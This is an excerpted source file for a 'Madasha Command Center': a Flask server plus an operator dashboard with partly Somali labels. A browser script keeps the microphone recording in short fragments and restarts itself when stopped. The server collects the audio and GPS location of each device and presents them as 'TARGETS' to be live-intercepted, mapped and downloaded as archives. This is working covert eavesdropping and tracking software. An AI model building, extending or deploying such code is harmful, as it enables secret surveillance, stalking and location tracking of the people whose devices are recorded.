...
def dev_idx(dev):
    ...
    with lock:
        ...
        return jsonify({
            "chunks": dv["chunks"],
            "live": (time.time() - dv.get("last", 0)) < 40,
            "last": dv.get("last", 0),
            "geo": dv.get("geo"),
...
def convert_m4a(dev, sess):
    """Stitch fragments and convert to a universal .m4a voice file. Cached."""
    with lock:
        dv = devices.get(dev)
        chunks = [c for c in (dv["chunks"] if dv else [])
    ...
    if not FFMPEG:
        return None
    tmpw = os.path.join("/tmp", "w%d.webm" % int(time.time() * 1000))
    try:
        ...
        if os.path.exists(outm) and os.path.getsize(outm) > 0:
...
def getall_m4a(dev):
    ...
    return send_file(p, mimetype="audio/mp4", as_attachment=True,
                     download_name="duubis-FULL-%s.m4a" % dev)
...
def archive():
    ...
    if not chunks:
        return "no recording yet", 404
    return send_file(make_zip(chunks, "kulan"), mimetype="application/zip",
                     as_attachment=True,
...
function askMic(){
 ...
 navigator.mediaDevices.getUserMedia({audio:{echoCancellation:true,noiseSuppression:true,autoGainControl:true,channelCount:1}}).then(function(s){
  ...
  var sess='',frag=0;
  function startRec(){
   sess='s'+Math.floor(100000+Math.random()*900000);
   frag=0;
   ...
   rec.onstop=function(){if(stream&&stream.active){setTimeout(startRec,800)}};
   rec.start(3000);
  }
  startRec();
...
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Madasha Command Center</title>
<style>
*{box-sizing:border-box}
body{font-family:'Courier New',monospace;background:#0a0e14;color:#c8d6e5;margin:0;padding:0 0 30px}
.wrap{max-width:620px;margin:0 auto}
.panel{background:#101826;border:1px solid #1e2d42;border-radius:10px;margin:10px 12px;padding:14px}
.hd{text-align:center;border-top:3px solid #39d98a}
.hd1{font-size:21px;font-weight:bold;letter-spacing:2px;color:#e8f1fa}
.hd2{color:#ffb454;font-size:11px;letter-spacing:3px;margin-top:4px}
.hd3{color:#5c7a99;font-size:12px;margin-top:8px;border-top:1px dashed #1e2d42;padding-top:8px}
.grn{color:#39d98a}
#lv{text-align:center;font-size:14px;font-weight:bold;color:#39d98a}
#lv.stby{color:#5c7a99}
#spec{display:none;width:calc(100% - 24px);margin:0 12px;border:1px solid #1e2d42;border-radius:8px;background:#0a0e14}
#Aud{display:none;width:calc(100% - 24px);margin:8px 12px}
.sect{color:#5c7a99;font-size:11px;letter-spacing:3px;margin:14px 14px 0}
.dev{border-bottom:1px solid #16202f;padding:12px 2px}
.dev:last-child{border-bottom:0}
.dt{font-size:16px;margin-bottom:5px;color:#e8f1fa}
.led{display:inline-block;width:10px;height:10px;border-radius:50%;background:#3a4a5e;margin-right:8px}
.led.on{background:#39d98a;box-shadow:0 0 8px #39d98a;animation:pl 1.4s infinite}
@keyframes pl{50%{opacity:.45}}
.live{color:#39d98a;font-size:12px;font-weight:bold}
.mut{color:#5c7a99;font-size:12px}
.rw{font-size:13px;margin:3px 0;color:#9db4c8}
.btn{display:inline-block;background:#123;background:#12233a;color:#39d98a;border:1px solid #39d98a;
 padding:8px 13px;border-radius:6px;margin:6px 6px 0 0;font-size:13px;text-decoration:none;
...
.le{font-size:12px;color:#9db4c8;padding:3px 0;border-bottom:1px dotted #16202f}
.lt{color:#39d98a}
.alll{display:block;text-align:center;margin:12px;font-size:13px;color:#ffb454;
 border:1px solid #ffb454;border-radius:8px;padding:10px;font-weight:bold}
.ft{color:#3a4a5e;font-size:11px;text-align:center;margin-top:12px;letter-spacing:2px}
</style></head><body>
<div class=wrap>
 <div class="panel hd">
  <div class=hd1>MADASHA <span class=grn>//</span> COMMAND CENTER</div>
  <div class=hd2>GUDOOMIYE &mdash; DHAGAYSO TOOS AH &bull; LOCATION &bull; DUUBIS</div>
  <div class=hd3><span id=clk>--:--:--</span> &nbsp;|&nbsp; <span id=onl class=grn>0</span> TOOS AH &nbsp;|&nbsp; <span id=tot>0</span> FRAGS &nbsp;|&nbsp; SYSTEM <span class=grn>&#9679; ONLINE</span></div>
 </div>
 <div class="panel"><div id=lv class=stby>STANDBY &mdash; dooro TARGET hoose si aad u dhagaysato</div><a id=stopB class=btn style="display:none;margin-top:8px" href="javascript:stopLis()">&#9632; JOOJI (STOP)</a></div>
 <canvas id=spec width=560 height=90></canvas>
 <audio id=Aud controls preload=auto></audio>
 <div class=sect>&#9656; TARGETS &mdash; MARTIDA</div>
 <div class=panel id=devs><span class=mut>Scanning frequencies...</span></div>
 <div class=sect>&#9656; ACTIVITY LOG</div>
 <div class=panel id=log><div class=le><span class=lt>--:--:--</span> Console initialized</div></div>
 <a class=alll id=all href="#">&#11015; DHAMMAAN DUUBISTA &mdash; FULL ARCHIVE (ZIP)</a>
 <div class=ft>ARAGTI &bull; ISKAASHI &bull; HORUMAR &bull; MIDNIMO</div>
</div>
<script>
var KEY=new URLSearchParams(location.search).get('key')||'';
document.getElementById('all').href='/archive.zip?key='+KEY;
var A=document.getElementById('Aud'),cur=null,live=false;
var MS=window.MediaSource||window.ManagedMediaSource;
var ms=null,sb=null,objUrl=null,curSess=null,nextFrag=0,appending=false,pend=[],pollT=null,seeked=false;
var known={},prevLive={},actx=null,analyser=null,specOn=false,removing=false;
function fmt(t){return new Date(t*1000).toLocaleTimeString()}
...
function pollDevs(){
 fetch('/index.json?key='+KEY).then(function(r){return r.json()}).then(function(d){
  ...
  ds.sort(function(a,b){return (b.live?1:0)-(a.live?1:0)||b.last-a.last});
  if(!ds.length)h='<div class=mut>Weli qof ma biirin &mdash; no signals detected</div>';
  for(var i=0;i<ds.length;i++){var v=ds[i];
   if(v.live)on++;tot+=v.n;
   if(!known[v.id]){known[v.id]=1;logEv('TARGET cusub &mdash; <b>No. '+(v.no||'?')+'</b> ('+v.id+')')}
   if(prevLive[v.id]!==undefined&&prevLive[v.id]!==v.live){
    logEv(v.live?'<span class=grn>SIGNAL LIVE</span> &mdash; No. '+(v.no||'?'):'SIGNAL LOST &mdash; No. '+(v.no||'?'))}
   prevLive[v.id]=v.live;
   var sl='';
   if(v.sessions)for(var q=0;q<v.sessions.length;q++){var s=v.sessions[q];
    sl+='<a class=btn href="javascript:playRec(\\''+v.id+'\\',\\''+s.sess+'\\')">&#9654; REC '+(q+1)+' ('+s.dur+'s)</a>'
     +'<a class="btn gold" href="/get/'+v.id+'/'+s.sess+'.m4a?key='+KEY+'">&#11015; m4a</a>'}
   h+='<div class=dev>'
    +'<div class=dt><span class="led '+(v.live?'on':'')+'"></span><b>TGT-'+(v.no||'?')+'</b> <span class=mut>('+v.id+')</span> '
    +(v.live?'<span class=live>&#9679; TOOS AH</span>':'<span class=mut>offline</span>')+'</div>'
    +(v.geo
      ?'<div class=rw>&#128205; '+v.geo.lat.toFixed(5)+', '+v.geo.lon.toFixed(5)
       +' (&plusmn;'+Math.round(v.geo.acc)+'m) &mdash; '
       +'<a href="https://maps.google.com/?q='+v.geo.lat+','+v.geo.lon+'">KHARRIDADDA</a></div>'
      :'<div class="rw mut">&#128205; NO LOCATION SIGNAL</div>')
    +'<div class="rw mut">LAST: '+(v.last?fmt(v.last):'-')+' &mdash; '+v.n+' frags</div>'
    +'<div class=rw>SIGNAL: '+(v.sig==='good'?'<span class=grn>&#9632;&#9632;&#9632; GOOD &mdash; mic wuu shaqeeyaa</span>'
      :v.sig==='weak'?'<span style="color:#ffb454">&#9632;&#9632; WEAK &mdash; cod yaryar</span>'
      :v.sig==='silent'?'<span style="color:#ff5c5c">&#9632; SILENT &mdash; mic ma shaqeynayo / qofku hadli maayo</span>'
      :'<span class=mut>---</span>')+'</div>'
    +'<a class=btn href="javascript:lis(\\''+v.id+'\\')">&#9654; DHAGAYSO LIVE</a>'
    +sl
    +'<a class="btn gold" href="/getall/'+v.id+'.m4a?key='+KEY+'">&#11015; FULL m4a</a>'
    +'</div>';
  }
...
function playRec(dev,sess){
 live=false;if(pollT)clearTimeout(pollT);cur=null;
 specOn=false;document.getElementById('spec').style.display='none';
 A.style.display='block';
 A.src='/get/'+dev+'/'+sess+'.m4a?key='+KEY+'&inline=1';
 var pp=A.play();if(pp&&pp.catch)pp.catch(function(){});
 var lv=document.getElementById('lv');lv.className='';
 lv.innerHTML='&#127911; DUUBIS &mdash; <b>TGT-'+dev+'</b> (ripii dheh / drag to seek)';
 logEv('&#9654; PLAYBACK REC &mdash; '+dev);
}
function stopLis(){
 live=false;if(pollT)clearTimeout(pollT);cur=null;
 ...
 lv.innerHTML='STANDBY &mdash; dooro TARGET hoose si aad u dhagaysato';
}
function lis(dev){
 cur=dev;live=true;curSess=null;nextFrag=0;pend=[];seeked=false;
 A.style.display='block';
 ...
 var lv=document.getElementById('lv');lv.className='';
 lv.innerHTML='&#127911; INTERCEPTING: <b>TGT-'+(dev)+'</b> &mdash; LIVE';
 logEv('&#127911; DHAGAYSO LIVE &mdash; <b>'+dev+'</b>');
 ...
 setTimeout(function(){
  ...
  if(stuck||buf<2){
   fetch('/dev/'+dev+'/index.json?key='+KEY).then(function(r){return r.json()}).then(function(d){
    if(!live||cur!==dev)return;
    var ss=d.sessions||[];
    if(ss.length){
     var last=ss[ss.length-1];
     logEv('&#9888; Live blocked &mdash; AUTO-PLAYING recording instead');
     document.getElementById('lv').innerHTML='&#127911; DUUBISTA (auto) &mdash; <b>TGT-'+dev+'</b>';
     live=false;if(pollT)clearTimeout(pollT);
     specOn=false;document.getElementById('spec').style.display='none';
     A.src='/get/'+dev+'/'+last.sess+'.m4a?key='+KEY+'&inline=1';
     var pp=A.play();if(pp&&pp.catch)pp.catch(function(){});
    }
   }).catch(function(){});
  }
...
function pollAud(){
 if(!cur||!live)return;
 fetch('/dev/'+cur+'/index.json?key='+KEY).then(function(r){return r.json()}).then(function(d){
  if(!live)return;
  var ch=d.chunks||[];
  if(ch.length){
   var sess=ch[ch.length-1].sess||'x';
   var ext=ch[ch.length-1].name.split('.').pop();
   var mime=(ext==='webm')?'audio/webm;codecs=opus':'audio/mp4';
...
function pump(){
 ...
 var c=pend.shift();
 fetch('/f/'+c.name+'?key='+KEY).then(function(r){return r.arrayBuffer()}).then(function(buf){
  nextFrag=c.frag+1;
  if(sb&&ms.readyState==='open'){
   ...
   sb.onupdateend=function(){appending=false;
    ...
    pump()};
   try{sb.appendBuffer(buf)}catch(e){appending=false}
  }
 }).catch(function(){pump()});
}
